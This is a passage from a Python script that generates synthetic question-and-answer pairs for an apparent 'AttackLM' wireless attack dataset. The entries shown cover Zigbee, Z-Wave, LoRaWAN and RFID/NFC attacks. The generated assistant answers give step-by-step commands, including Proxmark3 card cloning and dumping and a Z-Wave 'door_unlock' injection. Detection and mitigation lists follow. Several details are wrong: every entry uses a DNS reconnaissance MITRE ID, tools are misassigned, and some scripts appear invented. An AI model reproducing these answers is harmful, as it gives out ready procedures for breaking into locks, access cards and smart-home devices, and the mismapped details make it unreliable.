        ],
    },
    {
        "category": "rf_attack",
        "name": "Zigbee Protocol Exploitation",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting Zigbee protocol weaknesses in IoT and smart home networks for unauthorized access and control.",
        "steps": "1. Identify Zigbee devices: `rtl_433 -f 868M -s 2M` (EU) or `rtl_433 -f 915M -s 2M` (US)\n2. Capture Zigbee traffic: `zigbee2mqtt -c config.yaml` or `killerbee/zbdump -f 11 -c capture.pcap`\n3. Analyze Zigbee frames: `wireshark capture.pcap` (look for network key exchange)\n4. Exploit Zigbee joining: `python3 zbstumbler.py -i /dev/ttyUSB0` (discover networks)\n5. Sniff network key during device joining: `python3 zbsniffer.py -c 11 -w network_key.pcap`\n6. Decrypt traffic with captured key: `wireshark -o zigbee.key=HEXKEY capture.pcap`\n7. Inject Zigbee commands: `python3 zbinject.py -c 11 -i /dev/ttyUSB0 --command on`",
        "detection": [
            "Zigbee network joining requests from unknown devices",
            "Zigbee traffic decryption failure (key mismatch)",
            "Unexpected Zigbee command frames (on/off to unauthorized devices)",
            "Zigbee network key exchange from unexpected source",
        ],
        "mitigations": [
            "Enable Zigbee network encryption (AES-128-CCM)",
            "Install-only mode for new device joining",
            "Firmware updates for Zigbee coordinator and devices",
            "Zigbee network key rotation per OWASP IoT Security",
            "Monitor for unauthorized Zigbee device joining attempts",
        ],
    },
    {
        "category": "rf_attack",
        "name": "Z-Wave Protocol Exploitation",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting Z-Wave protocol vulnerabilities in smart home and IoT networks for unauthorized control.",
        "steps": "1. Identify Z-Wave devices: `python3 zwavesniffer.py --device /dev/ttyUSB0 --channel EU`\n2. Capture Z-Wave traffic: use Z-Wave USB stick in promiscuous mode\n3. Analyze Z-Wave frames: identify home ID, node IDs, command classes\n4. Exploit Z-Wave inclusion: `python3 zwaveinject.py --command add_node --device /dev/ttyUSB0`\n5. Z-Wave downgrade attack (SmartStart bypass): force S0 unencrypted inclusion instead of S2\n6. Inject Z-Wave commands: `python3 zwaveinject.py --command door_unlock --node <NODE_ID> --device /dev/ttyUSB0`\n7. Or use key extraction: capture S2 key exchange during inclusion",
        "detection": [
            "Z-Wave inclusion requests from unknown devices",
            "Z-Wave S0 (unencrypted) inclusion on S2 network",
            "Unexpected Z-Wave command class execution",
            "Z-Wave network key exchange anomalies",
        ],
        "mitigations": [
            "Enforce Z-Wave S2 (Secure) inclusion only",
            "Disable Z-Wave S0 fallback on all devices",
            "Regular Z-Wave network key rotation",
            "Monitor for unauthorized Z-Wave device inclusion per OSSTMM",
            "Z-Wave controller firmware updates for S2 enforcement",
        ],
    },
    {
        "category": "rf_attack",
        "name": "LoRa/LoRaWAN Eavesdropping",
        "mitre_ids": ["T1590.002"],
        "desc": "Intercepting and analyzing LoRa/LoRaWAN communications used in IoT, smart city, and industrial networks.",
        "steps": "1. Set up LoRa SDR receiver: `rtl_sdr -f 868M -s 2.4M -g 30 -e capture.raw` (EU 868MHz)\n2. Or use dedicated LoRa gateway: `python3 lorasniffer.py --freq 868e6 --sf 7 --bw 125e3`\n3. Capture LoRa frames: record all uplink and downlink transmissions\n4. Decode LoRaWAN MAC layer: extract DevEUI, AppEUI, AppKey identifiers\n5. Analyze frame format: `python3 loradecode.py --file capture.raw`\n6. For ABP devices: use known NwkSKey/AppSKey to decrypt payload\n7. For OTAA devices: capture Join Request/Join Accept to derive session keys",
        "detection": [
            "Unexpected LoRa gateway transmissions on monitored frequencies",
            "LoRa frames with unknown DevEUI or AppEUI",
            "LoRaWAN Join Request anomalies",
            "Increased LoRa traffic volume from unrecognized sources",
        ],
        "mitigations": [
            "Use LoRaWAN 1.1 with improved security (NwkSKey/AppSKey separation)",
            "Implement frame counter validation to prevent replay",
            "Regular Application Key (AppKey) rotation per NIST SP 800-115",
            "Monitor for unauthorized LoRa gateway deployments",
            "Use Class B/C devices with downlink confirmation",
        ],
    },
    {
        "category": "rf_attack",
        "name": "RFID/NFC Cloning and Replay",
        "mitre_ids": ["T1590.002"],
        "desc": "Cloning and replaying RFID/NFC card signals for unauthorized physical access and payment fraud.",
        "steps": "1. Identify target card type: 125kHz (prox card) or 13.56MHz (Mifare/DESFire)\n2. For 125kHz prox cards: `python3 proxmark3.py --reader --freq 125k`\n3. Read prox card: `lf hid read` (Proxmark3 CLI)\n4. Clone to blank card: `lf hid clone <HEX_VALUE>`\n5. For 13.56MHz Mifare Classic: `hf mf read` (Proxmark3 CLI)\n6. Extract keys: `hf mf mfkey32` (offline key recovery)\n7. Dump card: `hf mf dump`\n8. Write to magic card: `hf mf restore --uid <TARGET_UID>`\n9. For NFC: use NFCGate or similar to relay NFC in real-time",
        "detection": [
            "Card access from unexpected locations or times",
            "Duplicate card reads (same UID, different physical location)",
            "NFC relay attacks (timing anomalies in authentication)",
            "Proxmark3 or similar reader detected near access points",
        ],
        "mitigations": [
            "Upgrade from Mifare Classic to Mifare DESFire or SEOS",
            "Implement card authentication with challenge-response",
            "Deploy card cloning detection (geolocation, timing analysis) per PTES",
            "Use multi-factor physical access (card + PIN or biometric)",
            "Monitor for RFID/NFC cloning equipment per MITRE ATT&CK",
        ],
    },
]

QUESTION_TEMPLATES = [
    "Explain {name} with a detailed step-by-step attack walkthrough for wireless networks.",
    "How does {name} work? Show me the exact commands and detection methods.",
    "For a wireless security assessment, detail the {name} attack technique.",
    "Walk me through {name} exploitation. What are the key indicators and mitigations?",
    "Demonstrate {name} with specific wireless tools and command syntax.",
    "What is {name}? Provide exploitation steps, protocol details, and defense strategies.",
    "Describe {name} targeting wireless systems. Include detection in WiFi/Bluetooth environments.",
    "In a {environment} context, how would you perform a {name} vulnerability assessment?",
    "Using the {framework} methodology, explain {name} and its security testing approach.",
    "Classify {name} by MITRE ATT&CK technique IDs. What are the priority detection rules for a {severity} severity environment?",
    "What are the forensic indicators of {name} in a {environment}? Map detections to {framework}.",
    "Provide a {framework}-aligned test plan for {name} targeting a {environment}.",
    "How would you detect and mitigate {name} in a {environment}? Rate as {severity} severity.",
    "Explain the wireless protocol-level mechanics of {name} and provide {framework}-compliant remediation.",
    "Design a purple team exercise for {name} in a {environment}. Include {framework} coverage mapping.",
    "What is the attack surface for {name} in a {environment}? Provide detection engineering guidance per {framework}.",
    "Create a {framework} test case for {name}. What {severity}-severity alert rules should be configured?",
    "How does {name} exploit wireless protocol weaknesses? Provide a {framework}-aligned detection strategy for {environment}.",
    "Map {name} to OWASP and MITRE ATT&CK. What are the key mitigations for a {environment} deployment?",
    "Detail the wireless attack chain for {name} in a {environment}. Include {framework} validation steps and {severity} severity classification.",
    "For {name} in a {environment}, what are the most effective detection signatures per {framework}?",
    "Describe {name} from an adversary perspective. How would you build resilience in a {environment} using {framework}?",
]


def generate_pairs(count: int | None = None) -> list[dict]:
    random.seed(SEED)
    pairs: list[dict] = []

    for attack in ATTACKS:
        category = attack["category"]
        name = attack["name"]
        mitre_ids = attack["mitre_ids"]

        env = random.choice(ENVIRONMENT_TYPES)
        severity = random.choice(SEVERITY_LEVELS)
        framework = random.choice(TESTING_FRAMEWORKS)

        template_pool = QUESTION_TEMPLATES.copy()
        random.shuffle(template_pool)

        n_variants = random.randint(4, 6)
        chosen = template_pool[: min(n_variants, len(template_pool))]

        for q_template in chosen:
            user = q_template.format(
                name=name,
                category=category.replace("_", " ").title(),
                environment=env,
                severity=severity,
                framework=framework,
            )

            assistant = f"**{name}** (MITRE: {', '.join(mitre_ids)})\n\n"
            assistant += f"**Category:** {category.replace('_', ' ').title()}\n\n"
            assistant += f"**Environment:** {env}\n\n"
            assistant += f"**Severity:** {severity.title()}\n\n"
            assistant += f"**Testing Framework:** {framework}\n\n"
            assistant += f"**Description:** {attack['desc']}\n\n"
            assistant += f"**Attack Steps:**\n{attack['steps']}\n\n"

            if attack.get("detection"):
                det = "\n".join(f"- {d}" for d in attack["detection"])
                assistant += f"**Detection:**\n{det}\n\n"

            if attack.get("mitigations"):
                mit = "\n".join(f"- {m}" for m in attack["mitigations"])
                assistant += f"**Mitigations:**\n{mit}\n"

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                }
            )

    random.shuffle(pairs)

    if count is not None and count > 0:
        pairs = pairs[:count]

    return pairs


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Acquire Wireless Attack dataset for AttackLM"
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of question-answer pairs to generate (default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = generate_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    from collections import Counter

    cat_counts = Counter()
    for p in pairs:
        for msg in p["messages"]:
            if msg["role"] == "assistant" and "**Category:**" in msg["content"]:
                for cat in [
                    "Wpa",
                    "Deauth",
                    "Rogue Ap",
                    "Bluetooth",
                    "Wireless Lan",
                    "Rf Attack",
                ]:
                    if cat in msg["content"]:
                        cat_counts[cat.replace(" ", "_").lower()] += 1
                        break

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "attacks",
        "display_name": "Wireless Attacks",
        "category": "wireless",
        "mitre_tactic": "TA0006",
        "description": f"Wireless attack dataset covering {len(cat_counts)} categories: WPA2/WPA3 attacks, deauthentication, rogue AP/evil twin, Bluetooth attacks, wireless LAN attacks, and RF-based attacks.",
        "source_file": data_file.name,
        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nWireless Attack dataset generated:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  Categories: {dict(cat_counts)}")
    print(f"  MITRE IDs: {unique_mitre}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
